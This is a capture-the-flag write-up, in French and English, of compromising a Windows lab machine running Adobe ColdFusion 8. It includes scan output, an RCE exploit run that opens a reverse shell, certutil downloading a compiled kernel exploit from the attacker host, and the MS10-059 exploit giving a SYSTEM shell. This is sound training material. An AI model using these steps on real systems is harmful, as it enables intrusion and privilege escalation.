## Recon

```
─# /home/blo/tools/nmapautomate/nmapauto.sh $ip

###############################################
###---------) Starting Quick Scan (---------###
###############################################

Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-02-27 18:24 CST
Initiating Ping Scan at 18:24
Scanning 10.129.136.143 [4 ports]
Completed Ping Scan at 18:24, 2.18s elapsed (1 total hosts)
Initiating Parallel DNS resolution of 1 host. at 18:24
Completed Parallel DNS resolution of 1 host. at 18:24, 0.00s elapsed
Initiating SYN Stealth Scan at 18:24
Scanning 10.129.136.143 [1000 ports]
SYN Stealth Scan Timing: About 99.99% done; ETC: 18:28 (0:00:00 remaining)
Completed SYN Stealth Scan at 18:28, 231.60s elapsed (1000 total ports)
Nmap scan report for 10.129.136.143
Host is up (2.0s latency).
Not shown: 997 filtered tcp ports (no-response)
PORT      STATE SERVICE
135/tcp   open  msrpc
8500/tcp  open  fmtp
49154/tcp open  unknown

----------------------------------------------------------------------------------------------------------
Open Ports : 135,8500,49154                                                                                                                                                                  
--------------------------------
```

**Deeeper Scan**
```
Service scan Timing: About 66.67% done; ETC: 18:33 (0:00:47 remaining)
Nmap scan report for 10.129.136.143
Host is up (0.58s latency).

PORT      STATE SERVICE VERSION
135/tcp   open  msrpc   Microsoft Windows RPC
8500/tcp  open  fmtp?
49154/tcp open  msrpc   Microsoft Windows RPC
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows
```


```
─# rpcclient -N -U '' $ip -p 49154
Cannot connect to server.  Error was NT_STATUS_IO_TIMEOUT
```

Un site web disponible au port `8500`. Let's check

```
Parent ..                                              dir   03/22/17 08:52 μμ
Application.cfm                                       1151   03/18/08 11:06 πμ
adminapi/                                              dir   03/22/17 08:53 μμ
administrator/                                         dir   03/22/17 08:55 μμ
classes/                                               dir   03/22/17 08:52 μμ
componentutils/                                        dir   03/22/17 08:52 μμ
debug/                                                 dir   03/22/17 08:52 μμ
images/                                                dir   03/22/17 08:52 μμ
install.cfm                                          12077   03/18/08 11:06 πμ
multiservermonitor-access-policy.xml                   278   03/18/08 11:07 πμ
probe.cfm                                            30778   03/18/08 11:06 πμ
scripts/                                               dir   03/22/17 08:52 μμ
wizards/                                               dir   03/22/17 08:52 μμ
```
Je trouve ces dossiers et j'accede aux administrator.
Dans celle-ci je trouve `Adobe ColdFusion 8 Administrator`
Let's search for exploit

```
└─# searchsploit coldfusion 8
----------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
 Exploit Title                                                                                                                                             |  Path
----------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
Adobe ColdFusion - 'probe.cfm' Cross-Site Scripting                                                                                                        | cfm/webapps/36067.txt
Adobe ColdFusion - Directory Traversal                                                                                                                     | multiple/remote/14641.py
Adobe ColdFusion - Directory Traversal (Metasploit)                                                                                                        | multiple/remote/16985.rb
Adobe ColdFusion 11 - LDAP Java Object Deserialization Remode Code Execution (RCE)                                                                         | windows/remote/50781.txt
Adobe Coldfusion 11.0.03.292866 - BlazeDS Java Object Deserialization Remote Code Execution                                                                | windows/remote/43993.py
Adobe ColdFusion 2018 - Arbitrary File Upload                                                                                                              | multiple/webapps/45979.txt
Adobe ColdFusion 6/7 - User_Agent Error Page Cross-Site Scripting                                                                                          | cfm/webapps/29567.txt
Adobe ColdFusion 7 - Multiple Cross-Site Scripting Vulnerabilities                                                                                         | cfm/webapps/36172.txt
Adobe ColdFusion 8 - Remote Command Execution (RCE)                                                                                                        | cfm/webapps/50057.py
Adobe ColdFusion 9 - Administrative Authentication Bypass 

```
ici je trouve un exploit de RCE.
Je met l'exploit en local, je le modifie et hop je suis dedans 

```
─# python3 coldfusion.py         

Generating a payload...
Payload size: 1496 bytes
Saved as: c39559fbd32947c597bc9bbc08db4a9f.jsp

Priting request...
Content-type: multipart/form-data; boundary=854f29a3ce9247d89abbcf5729ffc490
Content-length: 1697

--854f29a3ce9247d89abbcf5729ffc490
Content-Disposition: form-data; name="newfile"; filename="c39559fbd32947c597bc9bbc08db4a9f.txt"
Content-Type: text/plain


Printing some information for debugging...
lhost: 10.10.16.4
lport: 1337
rhost: 10.129.136.143
rport: 8500
payload: c39559fbd32947c597bc9bbc08db4a9f.jsp

Deleting the payload...

Listening for connection...

Executing the payload...
listening on [any] 1337 ...
connect to [10.10.16.4] from (UNKNOWN) [10.129.136.143] 49295
Microsoft Windows [Version 6.1.7600]
Copyright (c) 2009 Microsoft Corporation.  All rights reserved.
C:\ColdFusion8\runtime\bin>whoami
whoami
arctic\tolis
```

## Privilege Escalation
Je vais d'abord commencer par voir mes privilege

```
C:\ColdFusion8\runtime\bin>whoami /priv
whoami /priv

PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                               State   
============================= ========================================= ========
SeChangeNotifyPrivilege       Bypass traverse checking                  Enabled 
SeImpersonatePrivilege        Impersonate a client after authentication Enabled 
SeCreateGlobalPrivilege       Create global objects                     Enabled 
SeIncreaseWorkingSetPrivilege Increase a process working set            Disabled
```
Bon ici, J'ai le `SeImpersonatePrivilege` qui est active, so je vais voir quoi faire

- https://www.hackingarticles.in/windows-privilege-escalation-seimpersonateprivilege/

Mais ca ne marche pas, alors je vais verifier le kernel pour voir s'il existe d'eventuelle vulnerabilite
Pour cela je vais utiliser le `systeminfo` pour avoir la version et ensuite faire du Goole pour trouver un exploit
- https://www.exploit-db.com/exploits/40564

J'ai trouver celle-ci alors Let's dive on it
La vulnerabilite proviend de L'AFD. Le pilote de fonction auxiliaire (AFD) prend en charge les sockets Windows et se trouve dans le fichier afd.sys.
Une vulnérabilité de type élévation de privilèges existe lorsque l'AFD valide de manière incorrecte les données transmises au noyau depuis le mode utilisateur.
Un attaquant doit avoir des identifiants de connexion valides et être en mesure de se connecter localement pour exploiter la vulnérabilité.
se connecter localement pour exploiter la vulnérabilité.
Un attaquant qui réussirait à exploiter cette vulnérabilité pourrait
exécuter du code arbitraire en mode noyau (c'est-à-dire avec les privilèges NT AUTHORITY\SYSTEM
avec les privilèges NT).

```
└─# i686-w64-mingw32-gcc 40564.c -o afd_exploit.exe -lws2_32

└─# file afd_exploit.exe    
afd_exploit.exe: PE32 executable (console) Intel 80386, for MS Windows, 17 sections
```

Je l'ai compiler, No transferons et executons

```
C:\Users\tolis\Desktop>certutil -urlcache -f http://10.10.16.4/afd_exploit.exe afd_exploit.exe
certutil -urlcache -f http://10.10.16.4/afd_exploit.exe afd_exploit.exe
****  Online  ****
CertUtil: -URLCache command completed successfully.

C:\Users\tolis\Desktop
```

Elle marche pas alors je vais en chercher un autre

- https://github.com/SecWiki/windows-kernel-exploits/tree/master/MS10-059



```
C:\Users\tolis\DesktopMS10-059.exe
MS10-059.exe
/Chimichurri/-->This exploit gives you a Local System shell <BR>/Chimichurri/-->Usage: Chimichurri.exe ipaddress port <BR>
C:\Users\tolis\Desktop>MS10-059.exe 10.10.16.4 1337
MS10-059.exe 10.10.16.4 1337
/Chimichurri/-->This exploit gives you a Local System shell <BR>/Chimichurri/-->Changing registry values...<BR>/Chimichurri/-->Got SYSTEM token...<BR>/Chimichurri/-->Running reverse shell...<BR>/Chimichurri/-->Restoring default registry values...<BR>

└─# sudo rlwrap nc -lnvp 1337                        
listening on [any] 1337 ...
connect to [10.10.16.4] from (UNKNOWN) [10.129.136.143] 49718
Microsoft Windows [Version 6.1.7600]
Copyright (c) 2009 Microsoft Corporation.  All rights reserved.

C:\Users\tolis\Desktop>whoami
whoami
nt authority\system

C:\Users\tolis\Desktop>cd C:\users\administrator\desktop
cd C:\users\administrator\desktop

C:\Users\Administrator\Desktop>type root.txt
type root.txt
464950342532faa0105af8364357a3a8


```